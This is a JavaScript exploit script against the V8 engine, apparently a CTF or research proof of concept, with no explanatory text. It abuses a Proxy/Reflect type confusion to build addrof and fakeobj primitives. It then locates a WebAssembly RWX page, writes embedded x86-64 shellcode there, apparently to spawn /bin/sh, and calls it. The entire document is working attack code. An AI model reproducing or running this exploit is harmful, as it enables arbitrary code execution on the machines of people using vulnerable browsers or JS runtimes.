for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000);}
for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000);}

callFn = function (code) { try { code(); } catch (e) { console.log(''); } }

let proxy = new Proxy({}, {});
function run(prop, ...args) {
	let handler = {};
	const proxy = new Proxy(function(){}, handler);
	handler[prop] = (({v1 = ((v2 = (function () {
		var v3 = 0;
		var callFn = 0;
		if(a){return;}else{return;}
		(function () { v3(); });
		(function () {
			callFn = "\u0041".repeat(1024*32);
			v3 = [1.1];
			v4 = [{}].slice();
		})
		})) => (1))() }, ...args) => (1));
	Reflect[prop](proxy, ...args);
}

callFn((() => (run("construct", []))));
console.log(Object.getOwnPropertyNames(run));
callFn((() => (run("prop1"))));

function test() {
	run[0x10] = 0x12121212;
	console.log(proxy.length);
	if(proxy.length==1)
		quit();
	console.log("good");
	let convert = new ArrayBuffer(0x8);
	let f64 = new Float64Array(convert);
	let u32 = new Uint32Array(convert);

	function d2u(v) { f64[0] = v; return u32;}
	function u2d(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0];}
	function hex(d) { let val = d2u(d); return ("0x" + (val[1] * 0x100000000 + val[0]).toString(16)); }

	let shellcode = [0x6a6848b8, 0x2f62696e, 0x2f2f2f73, 0x504889e7, 0x68726901, 0x1813424, 0x1010101, 0x31f656be, 0x1010101, 0x81f60901, 0x1014801, 0xe6564889, 0xe631d2b8, 0x01010101, 0x353a0101, 0x01900f05];
	//let shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b];
	let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
	let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
	let f = wasm_mod.exports._Z3addii;
	console.log(f());
	print("[+] arr1[0] : "+proxy[0])
	print("[+] arr2[0] : "+hex(proxy[0x18]))
	arr2Map = proxy[4]
	var arr1Map = arr2Map - 0.000000000007900e-310
	print("[+] arr1Map : " + hex(arr1Map))
	print("[+] arr2Map : " + hex(arr2Map))

	let addrof = function(obj) {
		v4[0] = obj;
		return proxy[0x18];		// return arr2[0];
	}

	let fakeobj = function(addr) {
		proxy[0x18] = addr
		return v4[0]
	}

	let ab = new ArrayBuffer(0x100);
	let abAddr = addrof(ab);
	%DebugPrint(ab);
	print("[+] array_buf : "+hex(abAddr));
	let wasmObj = addrof(wasm_mod) + u2d(0xe8-0x10,0);
	print("[+] wasm_addr : "+hex(addrof(wasmObj)))

	var fake = [ arr1Map, 0, wasmObj, u2d(0,0x8) ].slice();
	var fakeAddr = addrof(fake) - u2d(0x20,0);
	var target = fakeobj(fakeAddr);
	print("[+] fake_addr : " + hex(fakeAddr));

	let rwx = target[0];
	print("[+] rwx : " + hex(rwx));
	fake[2] = abAddr + u2d(0x10, 0);
	target[0] = rwx;

	let dv = new DataView(ab);
	for (var i = 0; i < shellcode.length; i++) {
		dv.setUint32(i*4, shellcode[i]);
	}
	%DebugPrint(f);
	f();	
}

test();
